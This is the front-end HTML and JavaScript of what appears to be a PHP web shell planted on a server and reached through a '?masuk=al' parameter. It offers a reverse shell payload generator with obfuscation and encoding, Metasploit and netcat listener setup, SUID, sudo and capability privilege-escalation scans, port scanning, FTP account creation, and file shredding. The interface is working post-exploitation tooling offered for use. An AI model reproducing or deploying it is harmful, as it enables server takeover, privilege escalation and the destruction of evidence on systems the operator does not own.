  <div class="modal-head"><h3>Port Scanner</h3><button class="modal-close" onclick="closeModal('portModal')">&times;</button></div>
  <div class="modal-body">
    <div class="row-inline" style="margin-bottom:8px;"><div class="field"><label>Host</label><input type="text" id="portHost" value="localhost"></div><div class="field"><label>Port Range</label><input type="text" id="portRange" value="1-1024"></div></div>
    <div class="btn-row">
      <button class="btn" onclick="scanPorts()">Scan Range</button>
      <button class="btn ghost" onclick="scanCommonPorts()">Common Ports</button>
      <button class="btn ghost" onclick="listOpenPorts()">Open Ports</button>
    </div>
    <div id="portOutput" class="output-box" style="font-size:10.5px;">Results will appear here</div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('portModal')">Close</button></div>
</div></div>

<!-- SSH Modal -->
<div class="modal-overlay" id="sshModal"><div class="modal modal--md">
  <div class="modal-head"><h3>SSH Key Generator</h3><button class="modal-close" onclick="closeModal('sshModal')">&times;</button></div>
  <div class="modal-body">
    <div class="field" style="margin-bottom:8px;"><label>Key Type</label>
      <select id="sshKeyType"><option value="ed25519">ED25519 (Recommended)</option><option value="rsa2048">RSA 2048-bit</option><option value="rsa4096">RSA 4096-bit</option></select>
    </div>
    <div class="row-inline" style="margin-bottom:8px;"><div class="field"><input type="text" id="sshEmail" placeholder="user@example.com"></div><div class="field"><input type="password" id="sshPassphrase" placeholder="Passphrase (optional)"></div></div>
    <button class="btn" onclick="generateSSHKey()" style="margin-bottom:12px;">Generate Keys</button>
    <div class="field" style="margin-bottom:8px;"><label>Public Key</label><textarea id="sshPublic" readonly class="output-box sm" style="min-height:60px;"></textarea></div>
    <div class="field" style="margin-bottom:8px;"><label>Private Key</label><textarea id="sshPrivate" readonly class="output-box" style="min-height:100px;font-size:10.5px;"></textarea></div>
    <div class="btn-row"><button class="btn small" onclick="copySSHPublic()">Copy Public</button><button class="btn small ghost" onclick="copySSHPrivate()">Copy Private</button></div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('sshModal')">Close</button></div>
</div></div>

<!-- SUID Modal -->
<div class="modal-overlay" id="suidModal"><div class="modal modal--md">
  <div class="modal-head"><h3>SUID/SGID Scanner</h3><button class="modal-close" onclick="closeModal('suidModal')">&times;</button></div>
  <div class="modal-body">
    <div class="btn-row">
      <button class="btn" onclick="scanSUID()">SUID</button>
      <button class="btn ghost" onclick="scanSGID()">SGID</button>
      <button class="btn ghost" onclick="scanSUIDandSGID()">Both</button>
    </div>
    <div id="suidOutput" class="output-box" style="font-size:10.5px;">Click a button to scan</div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('suidModal')">Close</button></div>
</div></div>

<!-- Session Modal -->
<div class="modal-overlay" id="sessionModal"><div class="modal modal--md">
  <div class="modal-head"><h3>Session Manager</h3><button class="modal-close" onclick="closeModal('sessionModal')">&times;</button></div>
  <div class="modal-body">
    <div class="section-title">SESSION INFO</div>
    <div id="sessionInfo" class="section-card" style="font-size:12px;color:var(--primary);white-space:pre-wrap;">Loading...</div>
    <div class="btn-row">
      <button class="btn" onclick="extendSession()">Extend Session</button>
      <button class="btn ghost" onclick="loadSessionInfo()">Refresh</button>
    </div>
    <div id="sessionOutput" class="output-box sm">Status will appear here</div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('sessionModal')">Close</button></div>
</div></div>

<!-- RevShell Modal -->
<div class="modal-overlay" id="revshellModal"><div class="modal modal--lg">
  <div class="modal-head"><h3>Reverse Shell Generator</h3><button class="modal-close" onclick="closeModal('revshellModal')">&times;</button></div>
  <div class="modal-body">
    <div class="section-title">CONFIGURATION</div>
    <div class="row-inline" style="margin-bottom:8px;">
      <div class="field"><label>Attacker IP</label><input type="text" id="rsAttackerHost" placeholder="192.168.1.100"></div>
      <div class="field"><label>Port</label><input type="number" id="rsAttackerPort" value="4444" min="1" max="65535"></div>
    </div>
    <div class="row-inline" style="margin-bottom:8px;">
      <div class="field"><label>Shell Type</label>
        <select id="rsShellType" onchange="updateRSOptions()"><option value="bash">Bash</option><option value="sh">Sh</option><option value="python">Python 2</option><option value="python3">Python 3</option><option value="perl">Perl</option><option value="php">PHP</option><option value="nc">Netcat</option><option value="powershell">PowerShell</option><option value="ruby">Ruby</option></select>
      </div>
      <div class="field" id="rsNcOptions" style="display:none;"><label>Netcat Variant</label>
        <select id="rsNcType"><option value="standard">Standard (GNU nc)</option><option value="ncat">Ncat</option><option value="openbsd">OpenBSD nc</option></select>
      </div>
    </div>
    <div class="row-inline" style="margin-bottom:8px;">
      <div class="field"><label>Encoding</label>
        <select id="rsEncoding"><option value="none">No Encoding</option><option value="base64">Base64</option><option value="urlencode">URL Encode</option><option value="hex">Hex Encode</option></select>
      </div>
      <div class="field" style="display:flex;align-items:flex-end;"><label class="chk-row" style="margin:0;"><input type="checkbox" id="rsObfuscate"> Obfuscate</label></div>
    </div>
    <button class="btn" onclick="generateReverseShellPayload()" style="width:100%;margin-bottom:12px;">Generate Payload</button>
    <div id="rsOutputTabs" class="hidden" style="margin-bottom:14px;">
      <div style="display:flex;gap:10px;border-bottom:1px solid var(--border);margin-bottom:10px;">
        <button class="rs-tab-btn active" onclick="switchRSTab('original')" style="background:transparent;color:var(--primary);border:none;border-bottom:2px solid var(--primary);padding:6px 10px;font-size:11.5px;">Original</button>
        <button class="rs-tab-btn" id="rsEncodedTabBtn" onclick="switchRSTab('encoded')" style="background:transparent;color:var(--text-dim);border:none;border-bottom:2px solid transparent;padding:6px 10px;font-size:11.5px;display:none;">Encoded</button>
      </div>
      <div id="rsOriginalPayload" class="output-box sm" style="margin-bottom:8px;"></div>
      <div id="rsEncodedPayload" class="output-box sm hidden" style="margin-bottom:8px;"></div>
      <button class="btn small" onclick="copyToClipboardRS('rsOriginalPayload')">Copy Original</button>
      <button class="btn small ghost hidden" id="rsCopyEncodedBtn" onclick="copyToClipboardRS('rsEncodedPayload')">Copy Encoded</button>
    </div>
    <div class="section-title">LISTENER SETUP</div>
    <div class="row-inline" style="margin-bottom:8px;">
      <div class="field"><label>Listener Type</label>
        <select id="rsListenerType"><option value="nc">Netcat</option><option value="ncat">Ncat</option><option value="socat">Socat</option><option value="msfconsole">Metasploit</option><option value="bash">Bash</option><option value="python">Python</option></select>
      </div>
      <div class="field"><label>Port</label><input type="number" id="rsListenerPort" value="4444" min="1" max="65535"></div>
    </div>
    <button class="btn ghost" onclick="generateReverseShellListener()" style="width:100%;margin-bottom:8px;">Generate Listener</button>
    <div id="rsListenerOutput" class="output-box sm hidden" style="margin-bottom:8px;max-height:150px;"></div>
    <button class="btn small ghost hidden" id="rsCopyListenerBtn" onclick="copyToClipboardRS('rsListenerOutput')">Copy Listener</button>
    <div class="section-title" style="margin-top:14px;">DECODER</div>
    <div class="row-inline" style="margin-bottom:8px;">
      <div class="field"><label>Type</label><select id="rsDecodeType"><option value="base64">Base64</option><option value="urlencode">URL Encode</option><option value="hex">Hex</option></select></div>
    </div>
    <div class="field" style="margin-bottom:8px;"><label>Encoded Payload</label><textarea id="rsDecodeInput" placeholder="Paste encoded payload..."></textarea></div>
    <button class="btn ghost" onclick="decodeReverseShellPayload()" style="width:100%;margin-bottom:8px;">Decode</button>
    <div id="rsDecodeOutput" class="output-box sm hidden" style="margin-bottom:8px;max-height:150px;"></div>
    <button class="btn small ghost hidden" id="rsCopyDecodeBtn" onclick="copyToClipboardRS('rsDecodeOutput')">Copy Decoded</button>
    <div id="rsError" class="hidden" style="background:var(--danger-dim);border:1px solid var(--danger);color:var(--danger);padding:10px;border-radius:6px;margin-top:10px;font-size:11.5px;"></div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('revshellModal')">Close</button></div>
</div></div>

<!-- Service Modal -->
<div class="modal-overlay" id="serviceModal"><div class="modal modal--lg">
  <div class="modal-head"><h3>Service Manager</h3><button class="modal-close" onclick="closeModal('serviceModal')">&times;</button></div>
  <div class="modal-body" style="display:flex;flex-direction:column;height:100%;">
    <div style="margin-bottom:10px;">
      <div class="field" style="margin-bottom:8px;"><input type="text" id="serviceSearchInput" placeholder="Search services..."></div>
      <div class="btn-row">
        <button onclick="serviceFilterAll()" class="btn small service-filter-btn active">All</button>
        <button onclick="serviceFilterActive()" class="btn small ghost service-filter-btn">Active</button>
        <button onclick="serviceFilterInactive()" class="btn small ghost service-filter-btn">Inactive</button>
        <button onclick="loadServiceList()" class="btn small ghost">Refresh</button>
      </div>
    </div>
    <div id="serviceListContainer" class="output-box" style="flex:1;min-height:200px;">Loading services...</div>
    <div id="serviceLogsDiv" class="hidden" style="margin-top:14px;">
      <div class="section-card">
        <h4 id="serviceLogTitle" class="section-card-title" style="margin:0 0 10px 0;">Service Logs</h4>
        <div id="serviceLogsOutput" class="output-box"></div>
      </div>
    </div>
    <div id="serviceError" class="hidden" style="background:var(--danger-dim);border:1px solid var(--danger);color:var(--danger);padding:10px;border-radius:6px;margin-top:10px;font-size:11.5px;"></div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('serviceModal')">Close</button></div>
</div></div>

<!-- FTP Modal -->
<div class="modal-overlay" id="ftpModal"><div class="modal modal--lg" style="max-height:90vh;">
  <div class="modal-head"><h3>FTP Manager</h3><button class="modal-close" onclick="closeModal('ftpModal')">&times;</button></div>
  <div id="ftpFeedback" class="hidden" style="padding:12px 18px 0;">
    <div id="ftpFeedbackMsg" style="padding:10px;border-radius:6px;font-size:12px;border-left:4px solid var(--primary);"></div>
  </div>
  <div class="modal-body" style="overflow-y:auto;">
    <div class="section-card">
      <div class="section-card-head">
        <span class="section-card-title">FTP Service Status</span>
        <button class="btn small ghost" onclick="checkFtpStatus()">Refresh</button>
      </div>
      <div id="ftpQuickStatus" class="output-box sm" style="min-height:auto;">Checking...</div>
    </div>
    <div class="section-card">
      <div class="section-card-title">Create FTP User</div>
      <div class="row-inline" style="margin-bottom:8px;">
        <div class="field"><label>Username</label><input type="text" id="ftpNewUsername" placeholder="3-20 alphanumeric"></div>
        <div class="field"><label>Password</label><input type="password" id="ftpNewPassword" placeholder="Min 6 chars"></div>
      </div>
      <div class="field" style="margin-bottom:8px;"><label>Home Directory (Optional)</label><input type="text" id="ftpNewHomeDir" placeholder="Leave empty for current dir"></div>
      <button class="btn" onclick="createFtpUser()" id="ftpCreateBtn" style="width:100%;">Create User</button>
    </div>
    <div class="section-card">
      <button class="btn ghost" onclick="togglePrivilegeCheck()" style="width:100%;text-align:left;">Check Privilege Escalation Options</button>
      <div id="privileCheckPanel" class="hidden" style="margin-top:10px;">
        <div id="privileCheckInfo" class="output-box sm" style="min-height:auto;">Click button to analyze...</div>
      </div>
    </div>
    <div class="section-card">
      <div class="section-card-head">
        <span class="section-card-title">FTP Users</span>
        <button class="btn small ghost" onclick="listFtpUsers()" id="ftpRefreshBtn">Load Users</button>
      </div>
      <div id="ftpUsersList" class="output-box sm" style="margin-bottom:10px;">No users loaded.</div>
      <div id="ftpUserCapabilities" class="hidden" style="margin-bottom:10px;padding:8px;background:var(--ok-dim);border-radius:5px;font-size:10.5px;color:var(--primary);">User management status</div>
      <div class="row-inline" style="margin-bottom:8px;">
        <div class="field"><label>Select User</label><input type="text" id="ftpMgmtUsername" placeholder="Username"></div>
        <div class="field"><label>New Password</label><input type="password" id="ftpNewPass" placeholder="Optional"></div>
      </div>
      <div class="btn-row">
        <button class="btn small" onclick="changeFtpPassword()">Change Password</button>
        <button class="btn small danger" onclick="deleteFtpUser()">Delete User</button>
      </div>
    </div>
    <div class="section-card">
      <div class="section-card-head">
        <span class="section-card-title">Active Connections</span>
        <button class="btn small ghost" onclick="getActiveConnections()" id="ftpConnRefreshBtn">Refresh</button>
      </div>
      <div id="ftpActiveConnections" class="output-box sm" style="font-size:10.5px;min-height:60px;max-height:150px;">Click Refresh</div>
    </div>
    <div class="section-card">
      <div class="section-card-head">
        <span class="section-card-title">FTP Logs</span>
        <button class="btn small ghost" onclick="getFtpLogs()" id="ftpLogsRefreshBtn">Load</button>
      </div>
      <div class="field" style="margin-bottom:8px;"><input type="text" id="ftpLogsSearch" placeholder="Search logs..."></div>
      <div id="ftpLogsOutput" class="output-box sm" style="font-size:10.5px;">Click Load</div>
    </div>
    <div class="section-card">
      <div class="section-card-title">User Directory Management</div>
      <div class="row-inline" style="margin-bottom:8px;">
        <div class="field"><label>Username</label><input type="text" id="ftpDirUsername" placeholder="Select user"></div>
        <div class="field"><label>Home Directory</label><input type="text" id="ftpDirPath" placeholder="/home/username"></div>
      </div>
      <button class="btn" onclick="setUserDirectory()" style="width:100%;">Set Directory</button>
    </div>
    <div style="display:flex;gap:14px;margin-bottom:12px;">
      <div class="section-card" style="flex:1;">
        <div class="section-card-title">Backup Config</div>
        <button class="btn ghost" onclick="backupFtpConfig()" style="width:100%;">Create Backup</button>
      </div>
      <div class="section-card" style="flex:1;">
        <div class="section-card-title">SSL/FTPS Status</div>
        <button class="btn ghost" onclick="checkSSLStatus()" style="width:100%;">Check Status</button>
      </div>
    </div>
    <div id="ftpBackupSSLInfo" class="output-box sm hidden" style="margin-bottom:14px;"></div>
    <div class="section-card" style="margin-bottom:0;">
      <button class="btn ghost" onclick="toggleFtpConnectionInfo()" style="width:100%;text-align:left;">FTP Connection Information</button>
      <div id="ftpConnectionInfoPanel" class="hidden" style="margin-top:10px;">
        <div id="ftpConnectionInfo" class="output-box sm" style="min-height:auto;">Loading...</div>
      </div>
    </div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('ftpModal')">Close</button></div>
</div></div>

<div id="toast"></div>

<!-- ========== FILE MANAGER EXTENDED MODALS ========== -->

<!-- Copy/Move Modal -->
<div class="modal-overlay" id="fmCopyMoveModal"><div class="modal modal--sm">
  <div class="modal-head"><h3 id="fmCopyMoveTitle">Copy To</h3><button class="modal-close" onclick="closeModal('fmCopyMoveModal')">&times;</button></div>
  <div class="modal-body">
    <input type="hidden" id="fmCopyMoveAction" value="copy">
    <div class="field"><label>Destination Path</label>
      <input type="text" id="fmCopyMoveDest" placeholder="/path/to/destination" value="<?php echo htmlspecialchars($dir) ?>" oninput="fmAutocompletePath(this)">
      <div id="fmAutocompleteList" style="display:none;position:absolute;z-index:9999;background:var(--bg-panel);border:1px solid var(--border);border-radius:4px;max-height:150px;overflow-y:auto;font-size:11.5px;width:100%;"></div>
    </div>
    <div id="fmCopyMoveFiles" style="margin-top:8px;font-size:11.5px;color:var(--text-dim);max-height:120px;overflow-y:auto;"></div>
  </div>
  <div class="modal-foot"><button class="btn" id="fmCopyMoveExecBtn" onclick="fmExecCopyMove()">Execute</button><button class="btn ghost" onclick="closeModal('fmCopyMoveModal')">Cancel</button></div>
</div></div>

<!-- File Search Modal -->
<div class="modal-overlay" id="fmSearchModal"><div class="modal modal--md">
  <div class="modal-head"><h3>🔍 File Search</h3><button class="modal-close" onclick="closeModal('fmSearchModal')">&times;</button></div>
  <div class="modal-body">
    <div style="display:flex;gap:8px;margin-bottom:12px;">
      <input type="text" id="fmSearchQuery" placeholder="Search filename..." style="flex:1;background:var(--bg-input);border:1px solid var(--border);border-radius:5px;color:var(--text);padding:6px 10px;font-size:12px;">
      <input type="text" id="fmSearchDir" value="<?php echo htmlspecialchars($dir) ?>" placeholder="Search directory" style="flex:1;background:var(--bg-input);border:1px solid var(--border);border-radius:5px;color:var(--text);padding:6px 10px;font-size:12px;">
      <button class="btn" onclick="fmDoSearch()">Search</button>
    </div>
    <div id="fmSearchStatus" style="font-size:11.5px;color:var(--text-dim);margin-bottom:8px;"></div>
    <div id="fmSearchResults" class="fm-search-results"></div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('fmSearchModal')">Close</button></div>
</div></div>

<!-- Content Search (Grep) Modal -->
<div class="modal-overlay" id="fmGrepModal"><div class="modal modal--md">
  <div class="modal-head"><h3>📡 Content Search (Grep)</h3><button class="modal-close" onclick="closeModal('fmGrepModal')">&times;</button></div>
  <div class="modal-body">
    <div style="display:flex;gap:8px;margin-bottom:12px;flex-wrap:wrap;">
      <input type="text" id="fmGrepPattern" placeholder="Search text in files..." style="flex:2;min-width:150px;background:var(--bg-input);border:1px solid var(--border);border-radius:5px;color:var(--text);padding:6px 10px;font-size:12px;">
      <input type="text" id="fmGrepDir" value="<?php echo htmlspecialchars($dir) ?>" placeholder="Directory" style="flex:1;min-width:120px;background:var(--bg-input);border:1px solid var(--border);border-radius:5px;color:var(--text);padding:6px 10px;font-size:12px;">
      <input type="text" id="fmGrepExt" placeholder="ext (e.g. php)" style="width:80px;background:var(--bg-input);border:1px solid var(--border);border-radius:5px;color:var(--text);padding:6px 10px;font-size:12px;">
      <button class="btn" onclick="fmDoGrep()">Grep</button>
    </div>
    <div id="fmGrepStatus" style="font-size:11.5px;color:var(--text-dim);margin-bottom:8px;"></div>
    <div id="fmGrepResults" class="fm-search-results"></div>
  </div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('fmGrepModal')">Close</button></div>
</div></div>

<!-- File Info / Properties Modal -->
<div class="modal-overlay" id="fmInfoModal"><div class="modal modal--sm">
  <div class="modal-head"><h3 id="fmInfoTitle">File Properties</h3><button class="modal-close" onclick="closeModal('fmInfoModal')">&times;</button></div>
  <div class="modal-body" id="fmInfoBody"><div style="text-align:center;padding:20px;color:var(--text-dim);">Loading...</div></div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('fmInfoModal')">Close</button></div>
</div></div>

<!-- Chown Modal -->
<div class="modal-overlay" id="fmChownModal"><div class="modal modal--sm">
  <div class="modal-head"><h3 id="fmChownTitle">Change Owner</h3><button class="modal-close" onclick="closeModal('fmChownModal')">&times;</button></div>
  <div class="modal-body">
    <input type="hidden" id="fmChownTarget">
    <div class="row-inline" style="gap:8px;margin-bottom:10px;">
      <div class="field" style="flex:1;"><label>Owner</label><input type="text" id="fmChownOwner" placeholder="user"></div>
      <div class="field" style="flex:1;"><label>Group</label><input type="text" id="fmChownGroup" placeholder="group"></div>
    </div>
    <div class="chk-row"><label><input type="checkbox" id="fmChownRecursive"> Recursive</label></div>
  </div>
  <div class="modal-foot"><button class="btn" onclick="fmExecChown()">Apply</button><button class="btn ghost" onclick="closeModal('fmChownModal')">Cancel</button></div>
</div></div>

<!-- Archive Creation Modal -->
<div class="modal-overlay" id="fmArchiveModal"><div class="modal modal--sm">
  <div class="modal-head"><h3>🗜️ Create Archive</h3><button class="modal-close" onclick="closeModal('fmArchiveModal')">&times;</button></div>
  <div class="modal-body">
    <div class="row-inline" style="gap:8px;margin-bottom:10px;">
      <div class="field" style="flex:2;"><label>Archive Name</label><input type="text" id="fmArchiveName" placeholder="archive.zip"></div>
      <div class="field" style="flex:1;"><label>Format</label>
        <select id="fmArchiveFormat" onchange="fmUpdateArchiveExt()"><option value="zip">.zip</option><option value="tar">.tar</option><option value="tar.gz">.tar.gz</option></select>
      </div>
    </div>
    <div id="fmArchiveFiles" style="font-size:11.5px;color:var(--text-dim);max-height:120px;overflow-y:auto;"></div>
  </div>
  <div class="modal-foot"><button class="btn" onclick="fmExecArchive()">Create</button><button class="btn ghost" onclick="closeModal('fmArchiveModal')">Cancel</button></div>
</div></div>

<!-- Archive Contents Modal -->
<div class="modal-overlay" id="fmArchiveListModal"><div class="modal modal--md">
  <div class="modal-head"><h3 id="fmArchiveListTitle">Archive Contents</h3><button class="modal-close" onclick="closeModal('fmArchiveListModal')">&times;</button></div>
  <div class="modal-body" id="fmArchiveListBody"><div style="text-align:center;padding:20px;color:var(--text-dim);">Loading...</div></div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('fmArchiveListModal')">Close</button></div>
</div></div>

<!-- Extract Archive Modal -->
<div class="modal-overlay" id="fmExtractModal"><div class="modal modal--sm">
  <div class="modal-head"><h3>📦 Extract Archive</h3><button class="modal-close" onclick="closeModal('fmExtractModal')">&times;</button></div>
  <div class="modal-body">
    <input type="hidden" id="fmExtractFile">
    <div class="field" style="margin-bottom:10px;"><label>Extract to subfolder (leave empty for current directory)</label><input type="text" id="fmExtractTo" placeholder="subfolder name (optional)"></div>
  </div>
  <div class="modal-foot"><button class="btn" onclick="fmExecExtract()">Extract</button><button class="btn ghost" onclick="closeModal('fmExtractModal')">Cancel</button></div>
</div></div>

<!-- Tail / Log Viewer Modal -->
<div class="modal-overlay" id="fmTailModal"><div class="modal modal--full">
  <div class="modal-head"><h3 id="fmTailTitle">Tail File</h3><div style="display:flex;gap:8px;"><select id="fmTailLines" onchange="fmDoTail()"><option value="20">20 lines</option><option value="50" selected>50 lines</option><option value="100">100 lines</option><option value="200">200 lines</option><option value="500">500 lines</option></select><button class="btn small" onclick="fmDoTail()">Refresh</button><button class="modal-close" onclick="closeModal('fmTailModal')">&times;</button></div></div>
  <div class="modal-body"><input type="hidden" id="fmTailFile"><div id="fmTailContent" class="fm-tail-content">Loading...</div></div>
  <div class="modal-foot"><button class="btn ghost" onclick="closeModal('fmTailModal')">Close</button></div>
</div></div>

<!-- Shred Confirm Modal -->
<div class="modal-overlay" id="fmShredModal"><div class="modal modal--sm">
  <div class="modal-head"><h3>💀 Secure Delete (Shred)</h3><button class="modal-close" onclick="closeModal('fmShredModal')">&times;</button></div>
  <div class="modal-body">
    <div style="background:var(--danger-dim);border:1px solid var(--danger);padding:10px;border-radius:6px;margin-bottom:12px;font-size:11.5px;color:var(--danger);">
      <strong>WARNING:</strong> Files will be overwritten 3x with random data before deletion. This is IRREVERSIBLE.
    </div>
    <div id="fmShredFiles" style="font-size:11.5px;max-height:120px;overflow-y:auto;"></div>
  </div>
  <div class="modal-foot"><button class="btn danger" onclick="fmExecShred()">Shred & Delete</button><button class="btn ghost" onclick="closeModal('fmShredModal')">Cancel</button></div>
</div></div>

<!-- Context Menu -->
<div id="fmContextMenu" class="fm-ctx">
  <div class="fm-ctx-item" data-action="open">📂 Open</div>
  <div class="fm-ctx-item" data-action="view">👁️ View</div>
  <div class="fm-ctx-item" data-action="edit">✏️ Edit</div>
  <div class="fm-ctx-item" data-action="preview">🖼️ Preview</div>
  <div class="fm-ctx-sep"></div>
  <div class="fm-ctx-item" data-action="copy">📋 Copy</div>
  <div class="fm-ctx-item" data-action="cut">✂️ Cut</div>
  <div class="fm-ctx-item" data-action="rename">✏️ Rename</div>
  <div class="fm-ctx-item" data-action="info">ℹ️ Properties</div>
  <div class="fm-ctx-item" data-action="chmod">🔒 Chmod</div>
  <div class="fm-ctx-item" data-action="chown">👤 Chown</div>
  <div class="fm-ctx-sep"></div>
  <div class="fm-ctx-item" data-action="download">⬇️ Download</div>
  <div class="fm-ctx-item" data-action="tail">📜 Tail</div>
  <div class="fm-ctx-sep"></div>
  <div class="fm-ctx-item danger" data-action="delete">🗑️ Delete</div>
  <div class="fm-ctx-item danger" data-action="shred">💀 Shred</div>
</div>

<!-- Lightbox / Media Preview -->
<div id="fmLightbox" class="fm-lightbox">
  <button class="fm-lightbox-close" onclick="fmCloseLightbox()">&times;</button>
  <div id="fmLightboxContent"></div>
  <div id="fmLightboxTitle" class="fm-lightbox-title"></div>
</div>

<script>
/* ========== SYSTEM TOOLKIT v2 — Core UI Functions ========== */

/* Modal system (new pattern: .modal-overlay.open) */
function openModal(id){
  var m = document.getElementById(id);
  if(!m) return;
  m.classList.add('open');
  document.body.style.overflow = 'hidden';
  if(id === 'cronModal' && typeof loadCronJobs === 'function') loadCronJobs();
  if(id === 'logsModal' && typeof listLogFiles === 'function') listLogFiles();
  if(id === 'sessionModal' && typeof loadSessionInfo === 'function') loadSessionInfo();
  if(id === 'ftpModal'){
    if(typeof initFtpModal === 'function') initFtpModal();
    if(typeof checkFtpStatus === 'function') checkFtpStatus();
    if(typeof loadFtpConnectionInfo === 'function') loadFtpConnectionInfo();
  }
}
function closeModal(id){
  const m = document.getElementById(id);
  if(!m) return;
  m.classList.remove('open');
  if(!document.querySelector('.modal-overlay.open')) document.body.style.overflow = '';
}
document.addEventListener('click', function(e){
  if(e.target.classList && e.target.classList.contains('modal-overlay') && e.target.classList.contains('open')) closeModal(e.target.id);
});
document.addEventListener('keydown', function(e){
  if(e.key !== 'Escape') return;
  var open = document.querySelectorAll('.modal-overlay.open');
  if(open.length) closeModal(open[open.length-1].id);
});

/* View switching */
var labels = {files:'File Manager', shell:'Shell', tools:'System Tools', database:'Database', privesc:'Privilege Escalation', search:'Search', discover:'Website Discovery'};
var viewOrder = ['files','shell','tools','database','privesc','search','discover'];
var currentView = 'files';
document.querySelectorAll('.nav-item[data-view], .bn-item[data-view]').forEach(function(btn){
  btn.addEventListener('click', function(){ switchView(btn.dataset.view); });
});
function switchView(name){
  currentView = name;
  document.querySelectorAll('.nav-item[data-view], .bn-item[data-view]').forEach(function(b){ b.classList.toggle('active', b.dataset.view===name); });
  document.querySelectorAll('.view').forEach(function(v){ v.classList.remove('active'); });
  var el = document.getElementById('view-'+name);
  if(el) el.classList.add('active');
  var topLabel = document.getElementById('topbar-label');
  if(topLabel) topLabel.textContent = labels[name] || name;
  document.querySelectorAll('#swipe-dots i').forEach(function(d){ d.classList.toggle('on', d.dataset.dot===name); });
  var content = document.querySelector('.content');
  if(content) content.scrollTop = 0;
}
switchView('files');

/* Swipe between views (mobile) */
(function(){
  var el = document.querySelector('.content');
  var startX = 0, startY = 0, tracking = false;
  el.addEventListener('touchstart', function(e){
    if(window.innerWidth > 768) return;
    startX = e.touches[0].clientX; startY = e.touches[0].clientY; tracking = true;
  }, {passive:true});
  el.addEventListener('touchend', function(e){
    if(!tracking) return;
    tracking = false;
    var dx = e.changedTouches[0].clientX - startX;
    var dy = e.changedTouches[0].clientY - startY;
    if(Math.abs(dx) < 55 || Math.abs(dx) < Math.abs(dy)) return;
    var idx = viewOrder.indexOf(currentView);
    if(dx < 0 && idx < viewOrder.length-1) switchView(viewOrder[idx+1]);
    else if(dx > 0 && idx > 0) switchView(viewOrder[idx-1]);
  }, {passive:true});
})();

/* Clock */
function tick(){
  var d = new Date();
  var el = document.getElementById('clock');
  if(el) el.textContent = d.toLocaleTimeString('id-ID', {hour12:false});
}
setInterval(tick, 1000); tick();

/* Toast */
function toast(msg){
  var box = document.getElementById('toast');
  var el = document.createElement('div');
  el.className = 'toast-item';
  el.textContent = msg;
  box.appendChild(el);
  setTimeout(function(){ el.remove(); }, 3000);
}

/* Confirm action (reusable) */
function confirmAction(message, onConfirm){
  document.getElementById('confirm-message').textContent = message;
  var btn = document.getElementById('confirm-action-btn');
  var fresh = btn.cloneNode(true);
  btn.parentNode.replaceChild(fresh, btn);
  fresh.addEventListener('click', function(){ closeModal('modal-confirm'); onConfirm(); });
  openModal('modal-confirm');
}

/* Output area visibility */
var outputEl = document.getElementById('outputArea');
if(outputEl && outputEl.textContent.trim()) outputEl.classList.add('visible');


/* ========== Original Functions - Block 1 ========== */
// 🔥 PRIVILEGE ESCALATION MODULAR TOOLS - Simple helpers for buttons
function runSuidScan() { openModal('privescSuidModal'); setTimeout(() => { fetch('?masuk=al&action=privesc_suid', {method:'POST'}).then(r => r.json()).then(d => { const o = document.getElementById('privescSuidOutput'); o.innerHTML = d.success ? '<pre class="text-primary">' + d.output + '</pre>' : '<div class="text-danger">❌ ' + (d.error || d.output || 'Scan failed') + '</div>'; }).catch(e => { document.getElementById('privescSuidOutput').innerHTML = '<div class="text-danger">❌ ' + e.message + '</div>'; }); }, 100); }
function runSudoScan() { openModal('privescSudoModal'); setTimeout(() => { fetch('?masuk=al&action=privesc_sudo', {method:'POST'}).then(r => r.json()).then(d => { const o = document.getElementById('privescSudoOutput'); o.innerHTML = d.success ? '<pre class="text-primary">' + d.output + '</pre>' + (d.risk ? '<div style="color:#f80;">Risk: ' + d.risk + '</div>' : '') : '<div class="text-danger">❌ ' + (d.error || d.output || 'Scan failed') + '</div>'; }).catch(e => { document.getElementById('privescSudoOutput').innerHTML = '<div class="text-danger">❌ ' + e.message + '</div>'; }); }, 100); }
function runCapScan() { openModal('privescCapModal'); setTimeout(() => { fetch('?masuk=al&action=privesc_cap', {method:'POST'}).then(r => r.json()).then(d => { const o = document.getElementById('privescCapOutput'); o.innerHTML = d.success ? '<pre class="text-primary">' + d.output + '</pre>' : '<div class="text-danger">❌ ' + (d.error || d.output || 'Scan failed') + '</div>'; }).catch(e => { document.getElementById('privescCapOutput').innerHTML = '<div class="text-danger">❌ ' + e.message + '</div>'; }); }, 100); }
function runSymlinkScan() { openModal('privescSymlinkModal'); setTimeout(() => { fetch('?masuk=al&action=privesc_symlink', {method:'POST'}).then(r => r.json()).then(d => { const o = document.getElementById('privescSymlinkOutput'); o.innerHTML = d.success ? '<pre class="text-primary">' + d.output + '</pre>' : '<div class="text-danger">❌ ' + (d.error || d.output || 'Scan failed') + '</div>'; }).catch(e => { document.getElementById('privescSymlinkOutput').innerHTML = '<div class="text-danger">❌ ' + e.message + '</div>'; }); }, 100); }
function runPermsScan() { openModal('privescPermsModal'); setTimeout(() => { fetch('?masuk=al&action=privesc_perms', {method:'POST'}).then(r => r.json()).then(d => { const o = document.getElementById('privescPermsOutput'); o.innerHTML = d.success ? '<pre class="text-primary">' + d.output + '</pre>' : '<div class="text-danger">❌ ' + (d.error || d.output || 'Scan failed') + '</div>'; }).catch(e => { document.getElementById('privescPermsOutput').innerHTML = '<div class="text-danger">❌ ' + e.message + '</div>'; }); }, 100); }

// 🔥 PRIVILEGE ESCALATION MODULAR TOOLS - Define early for HTML button handlers

// Toggle collapse/expand of scan config content
function toggleScanOptionsContent(header) {
    const content = header.nextElementSibling;
    const toggle = header.querySelector('.scan-config-toggle');

    if (content.style.display === 'none') {
        content.style.display = 'block';
        toggle.textContent = '▼';
        toggle.style.transform = 'rotate(0deg)';
    } else {
        content.style.display = 'none';
        toggle.textContent = '▶';
        toggle.style.transform = 'rotate(0deg)';
    }
}

function toggleScanOptions() {
